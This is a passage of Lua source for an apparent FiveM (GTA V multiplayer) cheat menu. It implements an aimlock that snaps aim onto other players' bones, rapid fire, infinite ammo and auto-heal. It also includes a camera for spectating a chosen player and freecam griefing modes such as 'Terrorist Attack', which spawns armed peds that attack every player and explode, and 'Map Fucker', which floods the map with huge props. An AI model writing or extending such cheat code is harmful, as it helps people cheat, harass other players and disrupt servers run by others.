                   --local hitsoundlol = sum.f.CreateDui("https://www.myinstants.com/media/sounds/hitsound-mp3cut_2EHI4b0.mp3", 1, 1) --[[Skeet]]--
                   local hitsoundlol = sum.f.CreateDui("https://www.myinstants.com/media/sounds/neverlose.mp3", 1, 1) --[[NEVERLOSE]]--
                   sum.f.DestroyDui(hitsoundlol)
               end
           end
   
           if sum.c['weapons-hiteffect'] then
               if not sum.f.HasNamedPtfxAssetLoaded("core") then                        
                   sum.f.RequestNamedPtfxAsset("core")
               end    
                   local hit, p = sum.f.GetEntityPlayerIsFreeAimingAt(sum.f.PlayerId())
                   local pid = sum.f.PlayerPedId()    
                   local hit, coord = sum.f.GetPedLastWeaponImpactCoord(pid)
               if hit and sum.f.IsPedShooting(pid) and sum.f.IsEntityAPed(p) and not sum.f.IsEntityDead(p) then
                   sum.f.UseParticleFxAssetNextCall("core")                            
                   sum.f.StartNetworkedParticleFxNonLoopedAtCoord("ent_sht_electrical_box", coord, 0, 0, 0, 1.0, 0, 0, 0)    
               end
           end
   
   
   
           if sum.c['weapons-firegun'] then 
               local p = sum.f.PlayerPedId()
               local hit, coord = sum.f.GetPedLastWeaponImpactCoord(p)				
               if not sum.f.HasNamedPtfxAssetLoaded("core") then						
                   sum.f.RequestNamedPtfxAsset("core")
               end	
               if hit then 
                   sum.f.UseParticleFxAssetNextCall("core")							
                   sum.f.StartNetworkedParticleFxNonLoopedAtCoord("ent_sht_petrol_fire",coord.x, coord.y, coord.z,0,0,0,0.5,0,0,0)	
               end
           end
   
           if sum.c['weapons-bulletTrace'] then
               if sum.f.IsPedShooting(sum.f.PlayerPedId()) then 
                   local weapon = sum.f.GetCurrentPedWeaponEntityIndex(sum.f.PlayerPedId())
                   table.insert(sum.bulletImpact, {c = sum.f.GetFinalRenderedCamCoord() + (sum.f.rotationToDirection(sum.f.GetGameplayCamRot(2)) * 100), c2 = sum.f.GetEntityCoords(weapon), t = sum.f.GetGameTimer()})
               end
               for k, v in ipairs(sum.bulletImpact) do 
                   sum.f.DrawLine(v.c2.x, v.c2.y, v.c2.z, v.c.x, v.c.y, v.c.z, 255, 255, 255, 255)
                   if sum.f.GetGameTimer() - v.t >= 5000.0 then 
                       table.remove(sum.bulletImpact, k)
                   end
               end
           end
           
           
           if sum.c['weapons-rapidFire'] then
               if sum.f.IsDisabledControlPressed(0, 257) then
                   sum.f.ShootSingleBulletBetweenCoords(sum.f.GetFinalRenderedCamCoord() + (sum.f.rotationToDirection(sum.f.GetGameplayCamRot(2)) * 100)+0.01, sum.f.GetFinalRenderedCamCoord() + (sum.f.rotationToDirection(sum.f.GetGameplayCamRot(2)) * 100), 1.0, true, sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), sum.f.PlayerPedId(), true, false, 10.0)
               end
           end
   
           if sum.c['weapons-infammo'] then
               local _, gun = sum.f.GetCurrentPedWeapon(sum.f.PlayerPedId())
               sum.f.SetPedAmmo(sum.f.PlayerPedId(), gun, 200)  
           end
   
           if sum.c['weapons-noreload'] then
               sum.f.RefillAmmoInstantly(sum.f.PlayerPedId(), true)
           end
   
           
           if sum.c['weapons-bulletPreview'] then
               local weapon = sum.f.GetCurrentPedWeaponEntityIndex(sum.f.PlayerPedId())
               sum.f.DrawLine(sum.f.GetEntityCoords(weapon), sum.f.GetFinalRenderedCamCoord() + (sum.f.rotationToDirection(sum.f.GetGameplayCamRot(2)) * 100), 255, 255, 255, 255)
           end
   
           if sum.c['weapons-aimlock'] then
               for C in sum.f.enumeratePeds() do
                   if sum.combo[17] == 1 then
                       otherpos = sum.f.GetPedBoneCoords(C, 31086, 0.0, 0.0, 0.0)
                   elseif sum.combo[17] == 2 then
                       otherpos = sum.f.GetPedBoneCoords(C, 39317, 0.0, 0.0, 0.0)
                   elseif sum.combo[17] == 3 then
                       otherpos = sum.f.GetPedBoneCoords(C, 23553, 0.0, 0.0, 0.0)
                   elseif sum.combo[17] == 4 then
                       otherpos = sum.f.GetPedBoneCoords(C, 24818, 0.0, 0.0, 0.0)
                   elseif sum.combo[17] == 5 then
                       otherpos = sum.f.GetPedBoneCoords(C, 11816, 0.0, 0.0, 0.0)
                   end
                   if sum.c['weapons-aimlock-peds'] then 
                       R = C
                   else
                       R = sum.f.IsPedAPlayer(C)
                   end
                   local x, y, z = table.unpack(sum.f.GetEntityCoords(C))
                   local _, _x, _y = sum.f.GetScreenCoordFromWorldCoord(x, y, z)
                   local FOV = sum.s['weapons-aimlock-fov'].value
                   local selfpos, rot = sum.f.GetFinalRenderedCamCoord(), sum.f.GetEntityRotation(sum.f.PlayerPedId(), 2)
                   local angleX, angleY, angleZ = (otherpos - selfpos).x, (otherpos - selfpos).y, (otherpos - selfpos).z
                   local roll, pitch, yaw = -sum.curak.deg(sum.curak.atan2(angleX, angleY)) - rot.z, sum.curak.deg(sum.curak.atan2(angleZ, #sum.curak.vector3(angleX, angleY, 0.0))), 1.0
                   local roll = sum.f.lerp(sum.s['weapons-aimlock-smooth'].value, 0.0, roll) 
                   if C ~= sum.f.PlayerPedId() and sum.f.IsEntityOnScreen(C) and R then
                           if (_x > 0.5 - FOV / 2 and _x < 0.5 + FOV / 2 and _y > 0.5 - FOV / 2 and _y < 0.5 + FOV / 2) then
                               if sum.f.IsAimCamActive() then
                                   if sum.c['weapons-aimlock-vischeck'] then 
                                       if sum.f.HasEntityClearLosToEntity(sum.f.PlayerPedId(), C, 19) then 
                                           if sum.c['weapons-aimlock-deads'] then 
                                               if sum.f.IsEntityDead(C) then 
                                                   sum.f.SetGameplayCamRelativeRotation(roll, pitch, yaw)
                                               else
                                                   sum.f.SetGameplayCamRelativeRotation(roll, pitch, yaw)	
                                               end
                                           else
                                               if sum.f.IsEntityDead(C) then 
                                               else
                                                   sum.f.SetGameplayCamRelativeRotation(roll, pitch, yaw)
                                               end
                                           end
                                       else
                                       end
                                   else
                                       if sum.c['weapons-aimlock-deads'] then 
                                           if sum.f.IsEntityDead(C) then 
                                               sum.f.SetGameplayCamRelativeRotation(roll, pitch, yaw)
                                           else
                                               sum.f.SetGameplayCamRelativeRotation(roll, pitch, yaw)	
                                           end
                                       else
                                           if sum.f.IsEntityDead(C) then 
                                           else
                                               sum.f.SetGameplayCamRelativeRotation(roll, pitch, yaw)
                                           end
                                       end
                                   end
                               end							
                           end
                       end
                   end
               end
   
           if sum.c['weapons-aimlock-fov']  then 
               sum.f.RequestStreamedTextureDict('mpmissmarkers256', 1)
               sum.f.DrawSprite("mpmissmarkers256","corona_shade",0.5,0.5, sum.s['weapons-aimlock-fov'].value, sum.s['weapons-aimlock-fov'].value * 1.8 ,0.0,0,0,0,50)
           end
   
           if sum.c['weapons-aimbot-fov']  then 
               sum.f.RequestStreamedTextureDict('mpmissmarkers256', 1)
               sum.f.DrawSprite("mpmissmarkers256","corona_shade",0.5,0.5, sum.s['weapons-aimbot-fov'].value, sum.s['weapons-aimbot-fov'].value * 1.8 ,0.0,0,0,0,50)
           end
   
           if sum.c['glife-aimbot-fov']  then 
               sum.f.RequestStreamedTextureDict('mpmissmarkers256', 1)
               sum.f.DrawSprite("mpmissmarkers256","corona_shade",0.5,0.5, sum.s['glife-aimbot-fov'].value, sum.s['glife-aimbot-fov'].value * 1.8 ,0.0,0,0,0,50)
           end
   
   
           if sum.c['vehicle-bunnyhop'] and sum.f.IsPedInAnyVehicle(sum.f.PlayerPedId(), false) then
               if sum.f.IsControlJustPressed(1, 22) and sum.f.IsPedInAnyVehicle(sum.f.PlayerPedId(), false) then
                   local veh = sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), 0)
                   sum.f.ApplyForceToEntity(veh, 3, 0.0, 0.0, 50.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
               end
           end
           
           if sum.c['vehicle-autorepair'] and sum.f.IsPedInAnyVehicle(sum.f.PlayerPedId(), false) then
               sum.f.SetVehicleFixed(sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), false))
           end
   
           if sum.c['vehicle-autorepairglife'] and sum.f.IsPedInAnyVehicle(sum.f.PlayerPedId(), false) then
               sum.f.SetVehicleFixed(sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), false))
           end
   
           if sum.c['vehicle-driftmode'] and sum.f.IsPedInAnyVehicle(sum.f.PlayerPedId(), false) then
               if sum.f.IsControlPressed(1, 21) and sum.f.IsPedInAnyVehicle(sum.f.PlayerPedId(), false) then
                   sum.f.SetVehicleReduceGrip(sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), false), true)
               else
                   sum.f.SetVehicleReduceGrip(sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), false), false)
               end
           end
           
           if sum.c['vehicle-hornboost'] and sum.f.IsPedInAnyVehicle(sum.f.PlayerPedId(), true) then
               if sum.f.IsControlPressed(1, 38) then
                   sum.f.SetVehicleForwardSpeed(sum.f.GetVehiclePedIsUsing(sum.f.PlayerPedId()), 80.0)
               end
           end
           
           if sum.c['vehicle-rainbowveh'] and sum.f.IsPedInAnyVehicle(sum.f.PlayerPedId(), false) then
               local rgb = sum.f.rainbowRGB(1.0)
               sum.f.SetVehicleCustomPrimaryColour(sum.f.GetVehiclePedIsUsing(sum.f.PlayerPedId()), rgb.r, rgb.g, rgb.b)
               sum.f.SetVehicleCustomSecondaryColour(sum.f.GetVehiclePedIsUsing(sum.f.PlayerPedId()), rgb.r, rgb.g, rgb.b)
           end
           
           
   
   
           
       end
   end)
   
   sum.curak.thr(function()
       while sum.menu do 
           if sum.c['player-smart-health'] then
               sum.f.SetEntityHealth(sum.f.PlayerPedId(), 100+sum.s['player-smart-health'].value)
           end
           sum.curak.wait(sum.s['player-smart-health-time'].value)
       end
   end)
   
   
   sum.curak.thr(function()
       while sum.menu do 
           if sum.c['player-smart-armor'] then 
               sum.f.SetPedArmour(sum.f.PlayerPedId(), sum.s['player-smart-armor'].value)
           end
           sum.curak.wait(sum.s['player-smart-armor-time'].value)
       end
   end)
   
   sum.curak.thr(function()
       while sum.menu do 
           sum.curak.wait(0)
           if sum.c['self-gameplay-fov'] then
               local gameplay_fov = gameplay_fov
               if not gameplay_fov ~= nil then
                   gameplay_fov = sum.f.CreateCam("DEFAULT_SCRIPTED_Camera", 1)
               end
               sum.f.RenderScriptCams(true, true, 700, 1, 1)
               sum.f.SetCamActive(gameplay_fov, true)
               
               sum.f.SetCamCoord(gameplay_fov, sum.f.GetGameplayCamCoord())
   
               local rotX = 0.0
               local rotY = 0.0
               local rotZ = 0.0
   
               sum.f.DisableControlAction(0, 32, true) -- W
               sum.f.DisableControlAction(0, 31, true) -- S
               sum.f.DisableControlAction(0, 30, true) -- D
               sum.f.DisableControlAction(0, 34, true) -- A
   
               local weapondelay = 0
   
               while sum.f.DoesCamExist(gameplay_fov) do
                   sum.curak.wait(0)
                   if not sum.c['self-gameplay-fov'] then
                       sum.f.DestroyCam(gameplay_fov, false)
                       sum.f.ClearTimecycleModifier()
                       sum.f.RenderScriptCams(false, true, 700, 1, 1)
                       sum.f.FreezeEntityPosition(sum.f.PlayerPedId(), false)
                       sum.f.SetFocusEntity(sum.f.PlayerPedId())
                       break
                   end
   
                   sum.f.SetCamFov(gameplay_fov, sum.s['self-gameplay-fov'].value)
   
   
                   rotX = rotX - (sum.f.GetDisabledControlNormal(1, 2) * 8.0)
                   rotZ = rotZ - (sum.f.GetDisabledControlNormal(1, 1) * 8.0)
   
                   if (rotX > 90.0) then
                       rotX = 90.0
                   elseif (rotX < -90.0) then
                       rotX = -90.0
                   end
   
                   if (rotY > 90.0) then
                       rotY = 90.0
                   elseif (rotY < -90.0) then
                       rotY = -90.0
                   end
   
                   if (rotZ > 360.0) then
                       rotZ = rotZ - 360.0
                   elseif (rotZ < -360.0) then
                       rotZ = rotZ + 360.0
                   end
   
               
                   if sum.c['fov-crosshair'] then
                       if sum.f.IsAimCamActive() then 
                           sum.f.ShowHudComponentThisFrame(14)
                       end
                   end
   
                   sum.f.SetCamCoord(gameplay_fov, sum.f.GetGameplayCamCoord())
   
                   if not sum.f.Displayed then
                       sum.f.SetFocusPosAndVel(sum.f.GetCamCoord(gameplay_fov).x,sum.f.GetCamCoord(gameplay_fov).y,sum.f.GetCamCoord(gameplay_fov).z,0.0,0.0,0.0) 
                       sum.f.SetCamRot(gameplay_fov, sum.f.GetGameplayCamRot(2), 2)
                   end
               end
           end
   
       
           if sum.c['troll-spectate'] then
               local spectate_cam = spectate_cam
               if not spectate_cam ~= nil then
                   spectate_cam = sum.f.CreateCam("DEFAULT_SCRIPTED_Camera", 1)
               end
               sum.f.RenderScriptCams(1, 0, 0, 1, 1)
               sum.f.SetCamActive(spectate_cam, true)
               local coords = sum.f.GetEntityCoords(sum.f.GetPlayerPed(sel.selectedPlayer))
               sum.f.SetCamCoord(spectate_cam, coords.x, coords.y, coords.z + 3)
   
               local offsetRotX = 0.0
               local offsetRotY = 0.0
               local offsetRotZ = 0.0
   
               sum.f.DisableControlAction(0, 32, true) -- W
               sum.f.DisableControlAction(0, 31, true) -- S
               sum.f.DisableControlAction(0, 30, true) -- D
               sum.f.DisableControlAction(0, 34, true) -- A
   
               local weapondelay = 0
   
               while sum.f.DoesCamExist(spectate_cam) do
                   sum.curak.wait(0)
                   if not sum.c['troll-spectate'] then
                       sum.f.DestroyCam(spectate_cam, false)
                       sum.f.ClearTimecycleModifier()
                       sum.f.RenderScriptCams(false, false, 0, 1, 0)
                       sum.f.FreezeEntityPosition(sum.f.PlayerPedId(), false)
                       sum.f.SetFocusEntity(sum.f.PlayerPedId())
                       break
                   end
   
                   local playerPed = sum.f.GetPlayerPed(sel.selectedPlayer)
                   local playerRot = sum.f.GetEntityRotation(playerPed, 2)
   
                   local rotX = playerRot.x
                   local rotY = playerRot.y
                   local rotZ = playerRot.z
   
                   offsetRotX = offsetRotX - (sum.f.GetDisabledControlNormal(1, 2) * 8.0)
                   offsetRotZ = offsetRotZ - (sum.f.GetDisabledControlNormal(1, 1) * 8.0)
   
                   if (offsetRotX > 90.0) then
                       offsetRotX = 90.0
                   elseif (offsetRotX < -90.0) then
                       offsetRotX = -90.0
                   end
   
                   if (offsetRotY > 90.0) then
                       offsetRotY = 90.0
                   elseif (offsetRotY < -90.0) then
                       offsetRotY = -90.0
                   end
   
                   if (offsetRotZ > 360.0) then
                       offsetRotZ = offsetRotZ - 360.0
                   elseif (offsetRotZ < -360.0) then
                       offsetRotZ = offsetRotZ + 360.0
                   end
   
                   local x, y, z = table.unpack(sum.f.GetCamCoord(spectate_cam))
                   local coords = sum.f.GetEntityCoords(sum.f.GetPlayerPed(sel.selectedPlayer)) + (sum.f.rotationToDirection(sum.f.GetCamRot(spectate_cam, 2)) * (0.5 * 1.5))
   
   
                   sum.f.SetCamCoord(spectate_cam, coords.x + 2.5, coords.y + 1.5, coords.z + 2 )
   
                   if not sum.f.Displayed then
                       sum.f.SetFocusPosAndVel(sum.f.GetCamCoord(spectate_cam).x,sum.f.GetCamCoord(spectate_cam).y,sum.f.GetCamCoord(spectate_cam).z,0.0,0.0,0.0) 
                       sum.f.SetCamRot(spectate_cam, offsetRotX, offsetRotY, offsetRotZ, 2)
                   end
               end
           end
           if sum.c['player-freecam'] then
               if not Displayed then
                   local camera = sum.f.CreateCam('DEFAULT_SCRIPTED_Camera', 1)
                   sum.f.RenderScriptCams(true, true, 700, 1, 1)
                   sum.f.SetCamActive(camera, true)
                   sum.f.SetCamCoord(camera, sum.f.GetGameplayCamCoord())
                   local offsetRotX = sum.f.GetGameplayCamRot(2).x
                   local offsetRotY = sum.f.GetGameplayCamRot(2).y
                   local offsetRotZ = sum.f.GetGameplayCamRot(2).z
                   
                   
                   while sum.f.DoesCamExist(camera) do
                       sum.curak.wait(0)
                       sum.f.DisableAllControlActions(0)
                       local currentmode = sum.freecam.modes[sum.freecam.mode]
                       local camera_rot = sum.f.GetCamRot(camera, 2)
                       local coords = sum.f.GetCamCoord(camera)
                       local adjustedRotation = {x = (sum.curak.pi / 180) * sum.f.GetCamRot(camera,0).x, y = (sum.curak.pi / 180) * sum.f.GetCamRot(camera,0).y, z = (sum.curak.pi / 180) * sum.f.GetCamRot(camera,0).z 	}	
                       local direction = {x = -sum.curak.sin(adjustedRotation.z) * sum.curak.abs(sum.curak.cos(adjustedRotation.x)), y = sum.curak.cos(adjustedRotation.z) * sum.curak.abs(sum.curak.cos(adjustedRotation.x)), z = sum.curak.sin(adjustedRotation.x)}	
                       local cameraRotation = sum.f.GetCamRot(camera,0)
                       local cameraCoord = sum.f.GetCamCoord(camera)	
                       local distance = 5000.0
                       local destination = {x = cameraCoord.x + direction.x * distance, y = cameraCoord.y + direction.y * distance, z = cameraCoord.z + direction.z * distance}	
                       local a, b, coords, d, entity = sum.f.GetShapeTestResult(sum.f.StartShapeTestRay(cameraCoord.x, cameraCoord.y, cameraCoord.z, destination.x, destination.y, destination.z, -1, -1, 1))
                       sum.f.SetCamFov(camera, sum.s['player-freecam-fov'].value)
                       
                       -------------------------------------------------------------------------------------------------------------------------------------------------
                       if not sum.c['player-freecam'] then
                           sum.f.DestroyCam(camera, false)
                           sum.f.ClearTimecycleModifier()
                           sum.f.RenderScriptCams(false, true, 700, 1, 0)
                           sum.f.FreezeEntityPosition(sum.f.PlayerPedId(), false)
                           sum.f.SetFocusEntity(sum.f.PlayerPedId())
                           break;
                       end
                       if not Displayed then
                           local playerPed = sum.f.PlayerPedId()
                           local playerRot = sum.f.GetEntityRotation(playerPed, 2)
   
                   
                           local rotX = playerRot.x
                           local rotY = playerRot.y
                           local rotZ = playerRot.z
                   
                           offsetRotX = offsetRotX - (sum.f.GetDisabledControlNormal(1, 2) * sum.s['player-freecam-sensitivity'].value)
                           offsetRotZ = offsetRotZ - (sum.f.GetDisabledControlNormal(1, 1) * sum.s['player-freecam-sensitivity'].value)
                   
                           if (offsetRotX > 90.0) then 
                               offsetRotX = 90.0 
                           elseif (offsetRotX < -90.0) then 
                               offsetRotX = -90.0 
                           end
                   
                           if (offsetRotY > 90.0) then 
                               offsetRotY = 90.0 
                           elseif (offsetRotY < -90.0) then 
                               offsetRotY = -90.0 
                           end
                   
                           if (offsetRotZ > 360.0) then 
                               offsetRotZ = offsetRotZ - 360.0 
                           elseif (offsetRotZ < -360.0) then 
                               offsetRotZ = offsetRotZ + 360.0 
                           end
   
                           local x, y, z = table.unpack(sum.f.GetCamCoord(camera))
                           local Vector = sum.curak.vector3(x, y, z)
                           local vecX, vecY, vecZ = sum.f.GetCamMatrix(camera)
                           local CurrentSpeed = sum.s['player-freecam-speed'].value
   
                           if sum.f.IsDisabledControlPressed(1, 36) then 
                               CurrentSpeed = CurrentSpeed / 15 
                           end
   
                           if sum.f.IsDisabledControlPressed(1, 21) then 
                               CurrentSpeed = CurrentSpeed * 3 
                           end
   
                           if sum.f.IsDisabledControlPressed(1, 32) then  
                               sum.f.SetCamCoord(camera, sum.f.GetCamCoord(camera) + (sum.f.rotationToDirection(sum.f.GetCamRot(camera, 2)) * ((CurrentSpeed))))
                           elseif sum.f.IsDisabledControlPressed(1, 33) then 
                               sum.f.SetCamCoord(camera, sum.f.GetCamCoord(camera) - (sum.f.rotationToDirection(sum.f.GetCamRot(camera, 2)) * ((CurrentSpeed))))
                           elseif sum.f.IsDisabledControlPressed(1, 22) then 
                               sum.f.SetCamCoord(camera, x, y, z + (CurrentSpeed))
                           elseif sum.f.IsDisabledControlPressed(1, 73) then 
                               sum.f.SetCamCoord(camera, x, y, z - (CurrentSpeed))
                           elseif sum.f.IsDisabledControlPressed(1, 34) then 
                               Vector = Vector - vecX * (CurrentSpeed) 
                               sum.f.SetCamCoord(camera, Vector, y, z)
                           elseif sum.f.IsDisabledControlPressed(1, 9) then 
                               Vector = Vector + vecX * (CurrentSpeed) 
                               sum.f.SetCamCoord(camera, Vector, y, z) 
                           end  
   
                           local cx, cy, cz = sum.curak.format("%.".. 1 .."f", coords.x), sum.curak.format("%.".. 1 .."f", coords.y), sum.curak.format("%.".. 1 .."f", coords.z)
                           local resX, resY = sum.f.GetActiveScreenResolution()
                           sum.f.DrawRect(0.5, 0.5, 0.009, 3/resY, 0, 0, 0, 255)
                           sum.f.DrawRect(0.5, 0.5, 3/resX, 0.009*1.8, 0, 0, 0, 255)
                           sum.f.DrawRect(0.5, 0.5, 0.008, 1/resY, 255, 255, 255, 255)
                           sum.f.DrawRect(0.5, 0.5, 1/resX, 0.008*1.8, 255, 255, 255, 255)
   
                           if currentmode == "Freeze Entity" then
                               if coords ~= sum.curak.vector3(0, 0, 0) and not sum.f.drawmenu then 
                                   if sum.f.IsDisabledControlPressed(0, 69) then
                                       sum.freecam.freezer = not sum.freecam.freezer
                                       sum.f.FreezeEntityPosition(entity, sum.freecam.freezer)
                                       if coords ~= sum.curak.vector3(0, 0, 0) and not sum.f.drawmenu then 
                                           if sum.f.IsDisabledControlPressed(0, 69) then
                                               sum.freecam.freezer = not sum.freecam.freezer
                                               sum.f.FreezeEntityPosition(entity, sum.freecam.freezer)
                                           end
                                       end
                                   end
                               end
                           end
   
   
                           if currentmode == "Tree Spawner" then
                               if coords ~= sum.curak.vector3(0, 0, 0) and not sum.f.drawmenu then 
                                   if sum.f.IsDisabledControlPressed(1, 68) then
                                       local tree = {"prop_tree_lficus_05", "prop_palm_sm_01f", "prop_tree_eng_oak_01"}
                                       local Proptree = (tree[sum.curak.random(#tree)])
                                       sum.f.CreateObject(sum.f.GetHashKey(Proptree),coords.x,coords.y,coords.z,true,true,true)
                                       sum.f.FreezeEntityPosition(Proptree, true)
                                   end
                               end
                               if coords ~= sum.curak.vector3(0, 0, 0) and not sum.f.drawmenu then 
                               if sum.f.IsDisabledControlJustPressed(0, 69) then 
                                       local tree = {"prop_tree_lficus_05", "prop_palm_sm_01f", "prop_tree_eng_oak_01"}
                                       local Proptree = (tree[sum.curak.random(#tree)])
                                       sum.f.CreateObject(sum.f.GetHashKey(Proptree),coords.x,coords.y,coords.z,true,true,true)
                                       sum.f.FreezeEntityPosition(Proptree, true)
                                   end
                               end
                           end
   
                           if currentmode == "Terrorist Attack" then
                               if coords ~= sum.curak.vector3(0, 0, 0) and not sum.f.drawmenu then 
                               if not sum.f.HasModelLoaded(sum.f.GetHashKey('mp_m_freemode_01')) then
                                   sum.f.RequestModel(sum.f.GetHashKey('mp_m_freemode_01'))
                               end
                               -- CREATE PED
                               if sum.f.IsDisabledControlJustPressed(0, 69) then 
                               local ped = sum.f.CreatePed(5, sum.f.GetHashKey('mp_m_freemode_01'), coords.x,coords.y,coords.z - 0.5,true,true)
                                   sum.f.SetPedDefaultComponentVariation(ped)
                                   sum.f.SetPedHeadBlendData(ped, 1, 1, 1, 2, 2, 2, 1.0, 1.0, 1.0, true)
                                   sum.f.SetPedComponentVariation(ped, 1, 115, 0, 2)
                                   sum.f.SetPedComponentVariation(ped, 3, 4, 0, 2)
                                   sum.f.SetPedComponentVariation(ped, 11, 12, 0, 2)
                                   sum.f.SetPedComponentVariation(ped, 8, 15, 0, 2)
                                   sum.f.SetPedComponentVariation(ped, 4, 56, 0, 2)
                                   sum.f.SetPedComponentVariation(ped, 6, 34, 0, 2)
                                   sum.f.GiveWeaponToPed(ped, sum.f.GetHashKey("WEAPON_ASSAULTRIFLE"), 200, 1, 1)
                                   for k, i in pairs(sum.f.GetActivePlayers()) do 
                                       sum.f.TaskCombatPed(ped, sum.f.GetPlayerPed(i), 0, 16)
                                   end
                               sum.curak.thr(function()
                                   sum.curak.wait(sum.s['player-freecam-terrorist'].value)
                                   sum.f.AddExplosion(sum.f.GetEntityCoords(ped), 34, 500.0, true, false, false, false)
                               end)
                           end
                               if sum.f.IsDisabledControlPressed(1, 68) then 
                                   local ped = sum.f.CreatePed(5, sum.f.GetHashKey('mp_m_freemode_01'), coords.x,coords.y,coords.z - 0.5,true,true)
                                       sum.f.SetPedDefaultComponentVariation(ped)
                                       sum.f.SetPedHeadBlendData(ped, 1, 1, 1, 2, 2, 2, 1.0, 1.0, 1.0, true)
                                       sum.f.SetPedComponentVariation(ped, 1, 115, 0, 2)
                                       sum.f.SetPedComponentVariation(ped, 3, 4, 0, 2)
                                       sum.f.SetPedComponentVariation(ped, 11, 12, 0, 2)
                                       sum.f.SetPedComponentVariation(ped, 8, 15, 0, 2)
                                       sum.f.SetPedComponentVariation(ped, 4, 56, 0, 2)
                                       sum.f.SetPedComponentVariation(ped, 6, 34, 0, 2)
                                       sum.f.GiveWeaponToPed(ped, sum.f.GetHashKey("WEAPON_ASSAULTRIFLE"), 200, 1, 1)
                                       for k, i in pairs(sum.f.GetActivePlayers()) do 
                                           sum.f.TaskCombatPed(ped, sum.f.GetPlayerPed(i), 0, 16)
                                       end
                                   sum.curak.thr(function()
                                       sum.curak.wait(1000)
                                       sum.f.AddExplosion(sum.f.GetEntityCoords(ped), 34, 500.0, true, false, false, false)
                                   end)
                               end
                           end
                       end
   
                           if currentmode == "Map Fucker" then
                               if coords ~= sum.curak.vector3(0, 0, 0) and not sum.f.drawmenu then 
                                   if sum.f.IsDisabledControlPressed(1, 68) then
                                       local props = {
                                           "hw1_lod_08_09_16_17_18",
                                           "cs4_lod_01_slod3",
                                           "dt1_11_dt1_tower_lod",
                                           "cs1_lod3_terrain_slod3_01",
                                           "dt1_19_lspd02_lod"
                                       }
                                       local Prop = (props[sum.curak.random(#props)])
                                       sum.f.CreateObject(sum.f.GetHashKey(Prop),coords.x,coords.y,coords.z,true,true,true)
                                   end
                               end
                                   if coords ~= sum.curak.vector3(0, 0, 0) and not sum.f.drawmenu then 
                                       if sum.f.IsDisabledControlJustPressed(0, 69) then 
                                           local props = {
                                               "hw1_lod_08_09_16_17_18",
                                               "cs4_lod_01_slod3",
                                               "dt1_11_dt1_tower_lod",
                                               "cs1_lod3_terrain_slod3_01",
                                               "dt1_19_lspd02_lod"
                                           }
                                           local Prop = (props[sum.curak.random(#props)])
                                           sum.f.CreateObject(sum.f.GetHashKey(Prop),coords.x,coords.y,coords.z,true,true,true)
                                       end
                                   end
                               end
   
   
                           if currentmode == "Prop Spawner" then
                               if coords ~= sum.curak.vector3(0, 0, 0) and not sum.f.drawmenu then 
                                   if sum.f.IsDisabledControlPressed(1, 68) then
                                       local smallprops = {"apa_mp_h_yacht_bed_01","bkr_prop_biker_bblock_hump_01","bkr_prop_printmachine_4rollerp_st","csx_coastbigroc03_","ce_xr_ctr2","csx_coastrok3_","ex_prop_crate_elec_sc","ex_prop_crate_clothing_sc","gr_prop_gr_basepart","gr_prop_gr_cnc_01a","gr_prop_gr_ramproof_gate","gr_prop_gr_target_small_04a","gr_prop_gr_target_small_01b","gr_prop_inttruck_carmod_01","hei_prop_carrier_jet","imp_prop_covered_vehicle_07a","imp_prop_flatbed_ramp","lf_house_09_","lf_house_08_","lf_house_05_","lf_house_10_","lf_house_11_","prop_haybailer_01","prop_phonebox_04","dt1_23_dt1_scaffold","prop_parking_hut_2","prop_dumpster_01a","prop_rub_carwreck_7","apa_mp_h_stn_chairarm_02","apa_mp_h_stn_chairarm_03","apa_mp_h_kit_kitchen_01_a","apa_mp_h_str_avunitm_01","apa_prop_flag_czechrep","bkr_prop_bkr_cashpile_07","bkr_prop_meth_chiller_01a","bkr_prop_prtmachine_dryer_spin",}
                                       local Prop = (smallprops[sum.curak.random(#smallprops)])
                                       sum.f.CreateObject(sum.f.GetHashKey(Prop),coords.x,coords.y,coords.z,true,true,true)
                                       sum.f.FreezeEntityPosition(Prop, true)
                                   end
                               end
                           if coords ~= sum.curak.vector3(0, 0, 0) and not sum.f.drawmenu then 
                               if sum.f.IsDisabledControlJustPressed(0, 69) then 
                                   local smallprops = {"apa_mp_h_yacht_bed_01","bkr_prop_biker_bblock_hump_01","bkr_prop_printmachine_4rollerp_st","csx_coastbigroc03_","ce_xr_ctr2","csx_coastrok3_","ex_prop_crate_elec_sc","ex_prop_crate_clothing_sc","gr_prop_gr_basepart","gr_prop_gr_cnc_01a","gr_prop_gr_ramproof_gate","gr_prop_gr_target_small_04a","gr_prop_gr_target_small_01b","gr_prop_inttruck_carmod_01","hei_prop_carrier_jet","imp_prop_covered_vehicle_07a","imp_prop_flatbed_ramp","lf_house_09_","lf_house_08_","lf_house_05_","lf_house_10_","lf_house_11_","prop_haybailer_01","prop_phonebox_04","dt1_23_dt1_scaffold","prop_parking_hut_2","prop_dumpster_01a","prop_rub_carwreck_7","apa_mp_h_stn_chairarm_02","apa_mp_h_stn_chairarm_03","apa_mp_h_kit_kitchen_01_a","apa_mp_h_str_avunitm_01","apa_prop_flag_czechrep","bkr_prop_bkr_cashpile_07","bkr_prop_meth_chiller_01a","bkr_prop_prtmachine_dryer_spin",}
                                   local Prop = (smallprops[sum.curak.random(#smallprops)])
                                   sum.f.CreateObject(sum.f.GetHashKey(Prop),coords.x,coords.y,coords.z,true,true,true)
                                   sum.f.FreezeEntityPosition(Prop, true)
                               end
                           end
                       end
   
                           if currentmode == "Ped Spawner" then
                               if coords ~= sum.curak.vector3(0, 0, 0) and not sum.f.drawmenu then 
                                   if sum.f.IsDisabledControlPressed(1, 68) then
                                       local pedTable = {"s_m_y_armymech_01","s_m_y_blackops_01","s_m_m_marine_01","s_m_y_blackops_03","s_m_y_blackops_02"}
                                       local randomPed = (pedTable[sum.curak.random(#pedTable)])
                                       if not sum.f.HasModelLoaded(sum.f.GetHashKey(randomPed)) then 
                                           sum.f.RequestModel(sum.f.GetHashKey(randomPed))
                                       end 
                                       sum.curak.wait(5)
                                           local ped = sum.f.CreatePed(3,sum.f.GetHashKey(randomPed),coords.x,coords.y,coords.z - 0.5,true,true)
                                           sum.f.SetEntityInvincible(ped, true)
                                           sum.f.GiveWeaponToPed(ped, sum.f.GetHashKey("WEAPON_CARBINERIFLE"), 200, 1, 1)
